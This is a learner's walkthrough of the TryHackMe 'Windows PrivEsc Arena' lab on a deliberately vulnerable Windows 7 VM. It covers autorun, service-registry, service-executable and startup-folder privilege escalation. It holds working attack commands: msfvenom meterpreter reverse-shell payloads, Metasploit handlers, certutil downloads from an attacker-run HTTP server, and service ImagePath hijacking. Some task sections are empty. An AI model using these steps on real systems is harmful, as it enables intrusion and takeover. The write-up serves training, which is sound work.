<h1 align="center">Windows PrivEsc Arena</h1>
<p align="center"><img width="80px" src="https://github.com/user-attachments/assets/2aa90eb0-ddef-4a78-bd1e-35f113e0c47a"><br>
2025, September 28<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>,<br>
and I’m excited to join you on this adventure, part of my <code>510</code>-day-streak in<a href="https://tryhackme.com"> TryHackMe</a>.<br>
<em>Students will learn how to escalate privileges using a very vulnerable Windows 7 VM. RDP is open. Your credentials are user:***********</em>.<br>
Access it <a href="https://tryhackme.com/room/windowsprivescarena">here</a>.<br>
<img width="1200px" src="https://github.com/user-attachments/assets/703ba7ba-4448-4f79-9c64-84ea59ca0c67"></p>

<br>
<h2 align="center">Task 1 . Connecting to TryHackMe network</h2>
<p>To complete this room and access the vulnerable Windows machine, you need to first connect to TryHackMe's VPN. If you've not done this before, first complete the OpenVPN room and learn how to connect.</p>

<p><em>Answer the question below</em></p>

<p>1.1.Connect to TryHackMe´s VPN..<br>
<code>No answer needed</code></p>



<br>
<h2 align="center">Task 2 . Deploy the vulnerable machine</h2>
<p>This room will teach you a variety of Windows privilege escalation tactics, including kernel exploits, DLL hijacking, service exploits, registry exploits, and more. This lab was built utilizing Sagi Shahar's privesc workshop (https://github.com/sagishahar/lpeworkshop) and utilized as part of The Cyber Mentor's Windows Privilege Escalation Udemy course (http://udemy.com/course/windows-privilege-escalation-for-beginners).<br>

<br>All tools needed to complete this course are on the <strong>user</strong> desktop (C:\Users\user\Desktop\Tools).<br>

Let's first connect to the machine.  RDP is open on port 3389.  Your credentials are:<br>

username: user<br>
password: ***********<br>

For any administrative actions you might take, your credentials are:<br>

username: TCM<br>
password: *********</p>

<p><em>Answer the questions below</em></p>

<p>2.1. Deploy the machine and log into the user account via RDP.<br>
<code>No answer needed</code></p>

```bash
apt install rdesktop
```

```bash
rdesktop -u user -p "***********" xx.xxx.xx.xxx -g 90%
```

<p>2.2. Open a command prompt and run 'net user'. Who is the other non-default user on the machine?<br>
<code>tcp</code></p>

<img width="963" height="163" alt="image" src="https://github.com/user-attachments/assets/724c1cdf-c46d-48d9-ab1c-ee8b0e09bf64" />




<br>
<br>
<h2 align="center">Task 3 . Registry Escalation - Autorun</h2>
<h3 align="center">Detection</h3>
<p>Windows VM<br>

1. Open command prompt and type: C:\Users\User\Desktop\Tools\Autoruns\Autoruns64.exe<br>
2. In Autoruns, click on the ‘Logon’ tab.<br>
3. From the listed results, notice that the “My Program” entry is pointing to “C:\Program Files\Autorun Program\program.exe”.<br>
4. In command prompt type: C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\Autorun Program"<br>
5. From the output, notice that the “Everyone” user group has “FILE_ALL_ACCESS” permission on the “program.exe” file.</p>

<h3 align="center">Exploitation</h3>

<p>Kali VM<br>

1. Open command prompt and type: msfconsole<br>
2. In Metasploit (msf > prompt) type: use multi/handler<br>
3. In Metasploit (msf > prompt) type: set payload windows/meterpreter/reverse_tcp<br>
4. In Metasploit (msf > prompt) type: set lhost [Kali VM IP Address]<br>
5. In Metasploit (msf > prompt) type: run<br>
6. Open an additional command prompt and type: msfvenom -p windows/meterpreter/reverse_tcp lhost=[Kali VM IP Address] -f exe -o program.exe<br>
7. Copy the generated file, program.exe, to the Windows VM.<br><br>

Windows VM<br>

1. Place program.exe in ‘C:\Program Files\Autorun Program’.<br>
2. To simulate the privilege escalation effect, logoff and then log back on as an administrator user.<br><br>

Kali VM<br>

1. Wait for a new session to open in Metasploit.<br>
2. In Metasploit (msf > prompt) type: sessions -i [Session ID]<br>
3. To confirm that the attack succeeded, in Metasploit (msf > prompt) type: getuid</p>

<p><em>Answer the questions below</em></p>

<p>3.1. Click 'Completed' once you have successfully elevated the machine<br>
<code>No answer needed</code></p>

<p align="center">Detection</p>

```bash
C:\Users\User\Desktop\Tools\Autoruns\Autoruns64.exe
```

```bash
C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\Autorun Program"
```

<img width="1150" height="530" alt="image" src="https://github.com/user-attachments/assets/951f1867-2488-4935-b7e8-c69b6d7594b6" />

<br>
<br>
<br>

<img width="1064" height="180" alt="image" src="https://github.com/user-attachments/assets/09b2df8b-35ce-4873-a89f-b61c1b8d334d" />

<br>
<br>
<br>

<img width="991" height="235" alt="image" src="https://github.com/user-attachments/assets/0830e90c-065b-4979-82ac-95a879a2ea98" />

<br>
<br>
<br>

<p align="center">Exploitation</p>

```bash
:~/WindowsPrivEscArena# mfsconsole -q
...
msf6>
```

```bash
msf6> use multi/handler
msf6 exploit(multi/handler) >
```

```bash
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
```

```bash
msf6 exploit(multi/handler) > set LHOST xx.xxx.xxx.xx
LHOST => xx.xxx.xxx.xx
```

```bash
msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on xx.xxx.xxx.xx:4444
```

<img width="1289" height="651" alt="image" src="https://github.com/user-attachments/assets/fc173d13-1141-444f-b8a9-7190e6e5a61b" />


```bash
:~/WindowsPrivEscArena# msfvenom -p windows/meterpreter/reverse_tcp LHOST=xx.xxx.xxx.xx LPORT=9001 -f exe -o program.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of exe file: 73802 bytes
Saved as: program.exe
```

<img width="580" height="85" alt="image" src="https://github.com/user-attachments/assets/9f059262-6490-4048-aa6d-4fb1239b3638" />

<br>
<br>
<br>

```bash
:~/WindowsPrivEscArena# msfvenom -p windows/meterpreter/reverse_tcp lhost=xx.xxx.xxx.xx -f exe -o program.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of exe file: 73802 bytes
Saved as: program.exe
```

<img width="1290" height="257" alt="image" src="https://github.com/user-attachments/assets/274aa886-b213-4ce2-8a31-585169307f34" />

<br>
<br>
<br>

```bash
:~/WindowsPrivEscArena# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

<br>

```bash
PS C:\Users\user> certutil.exe -urlcache -f http:/xx.xxx.xxx.xx:8000/program.exe program.exe
```

<img width="988" height="110" alt="image" src="https://github.com/user-attachments/assets/8f23fcf8-a235-4494-8e6c-141c94326451" />

<br>
<br>
<br>

```bash
:~/WindowsPrivEscArena# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
xx.xxx.xx.xxx - - [28/Sep/2025 21:05:17] "GET /program.exe HTTP/1.1" 200 -
```

```bash
:~/WindowsPrivEscArena# rdesktop -u TCM -p "*********" xx.xxx.xx.xxx -g 80%
```

<img width="1453" height="623" alt="image" src="https://github.com/user-attachments/assets/67ae340f-d63c-474f-8723-1d20ca3a5ba8" />

<br>
<br>
<br>

<img width="1287" height="226" alt="image" src="https://github.com/user-attachments/assets/72f7c93e-e81a-4ba6-9ef2-ddabff77f600" />

<br>
<br>
<br>
<h2 align="center">Task 4 . Registry Escalation - AlwaysInstallElevated</h2>
<h3 align="center">Detection</h3>


<h3 align="center">Exploitation</h3>

<p><em>Answer the questions below</em></p>

<p>4.1. Click 'Completed' once you have successfully elevated the machine<br>
<code>No answer needed</code></p>

<br>
<br>
<br>
<h2 align="center">Task 5 . Service Escalation - Registry</h2>
<h3 align="center">Detection</h3>


<h3 align="center">Exploitation</h3>

<p><em>Answer the questions below</em></p>

<p>5.1. Deploy the machine and log into the user account via RDP.<br>
<code>No answer needed</code></p>

<br>

<img width="985" height="289" alt="image" src="https://github.com/user-attachments/assets/eb6413ea-57da-4315-a93d-a1de097c67f5" />

<br>
<br>
<br>

<img width="979" height="245" alt="image" src="https://github.com/user-attachments/assets/f2dc897d-a21e-463b-b4d3-097d5edfa2ec" />

<br>
<br>
<br>

<img width="1239" height="218" alt="image" src="https://github.com/user-attachments/assets/d0a1450d-b8f4-4fc1-be6c-565539f35669" />

<br>
<br>
<br>

<img width="1182" height="398" alt="image" src="https://github.com/user-attachments/assets/a37f03d7-339b-44f1-9d1a-02b4d11f784e" />

<br>
<br>
<br>

<img width="1228" height="391" alt="image" src="https://github.com/user-attachments/assets/622229eb-5ed6-405b-802e-91863f94e6b9" />

<br>
<br>
<br>

```bash
:~/WindowsPrivEscArena# x86_64-w64-mingw32-gcc windows_service.c -o x.exe
```

```bash
:~/WindowsPrivEscArena# python3 -m http.server
```

```bash
PS C:\Temp> certutil.exe -urlcache -f http://xx.xxx.xxx.xx:8000/x.exe x.exe
```

```bash
PS C:\Temp> reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f
```

```bash
PS C:\Temp> sc start regsvc
```

```bash
PS C:\Temp> net start regsvc
```

<img width="985" height="552" alt="image" src="https://github.com/user-attachments/assets/aeb6d9e8-9cb2-42af-a0ec-1dc015d1e8dd" />

<br>
<br>
<br>
<h2 align="center">Task 6 . Service Escalation - Executable Files</h2>
<h3 align="center">Detection</h3>

<p>Windows VM<br>

1. Open command prompt and type: C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\File Permissions Service"<br>
2. Notice that the “Everyone” user group has “FILE_ALL_ACCESS” permission on the filepermservice.exe file.</p>

<h3 align="center">Exploitation</h3>
<p>Windows VM<br>

1. Open command prompt and type: copy /y c:\Temp\x.exe "c:\Program Files\File Permissions Service\filepermservice.exe"<br>
2. In command prompt type: sc start filepermsvc<br>
3. It is possible to confirm that the user was added to the local administrators group by typing the following in the command prompt: net localgroup administrators</p>

<p><em>Answer the questions below</em></p>

<p>6.1. Click 'Completed' once you have successfully elevated the machine<br>
<code>No answer needed</code></p>


<img width="979" height="243" alt="image" src="https://github.com/user-attachments/assets/65ca7f73-5e1e-413f-9e23-ce2d85fb5cb2" />

<br>
<br>
<br>

<img width="972" height="228" alt="image" src="https://github.com/user-attachments/assets/cde2e19d-6a52-4090-bc07-ffe97c85d162" />

<br>
<br>
<br>
<h2 align="center">Task 7 . Privilege Escalation - Stratup Applications/h2>
<h3 align="center">Detection</h3>
<p>Windows VM<br>

1. Open command prompt and type: icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"<br>
2. From the output notice that the “BUILTIN\Users” group has full access ‘(F)’ to the directory.</p>

<h3 align="center">Exploitation</h3>
<p>Kali VM<br>

1. Open command prompt and type: msfconsole<br>
2. In Metasploit (msf > prompt) type: use multi/handler<br>
3. In Metasploit (msf > prompt) type: set payload windows/meterpreter/reverse_tcp<br>
4. In Metasploit (msf > prompt) type: set lhost [Kali VM IP Address]<br>
5. In Metasploit (msf > prompt) type: run<br>
6. Open another command prompt and type: msfvenom -p windows/meterpreter/reverse_tcp LHOST=[Kali VM IP Address] -f exe -o x.exe<br>
7. Copy the generated file, x.exe, to the Windows VM.<br><br>

Windows VM<br>

1. Place x.exe in “C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup”.<br>
2. Logoff.<br>
3. Login with the administrator account credentials.<br><br>

Kali VM<br>

1. Wait for a session to be created, it may take a few seconds.<br>
2. In Meterpreter(meterpreter > prompt) type: getuid<br>
3. From the output, notice the user is “User-PC\Admin”</p>

<p><em>Answer the questions below</em></p>

<p>7.1. Click 'Completed' once you have successfully elevated the machine<br>
<code>No answer needed</code></p>

<img width="989" height="179" alt="image" src="https://github.com/user-attachments/assets/24312190-a7a6-4a69-921f-83f28d69753d" />


<br>
<br>

```bash


```


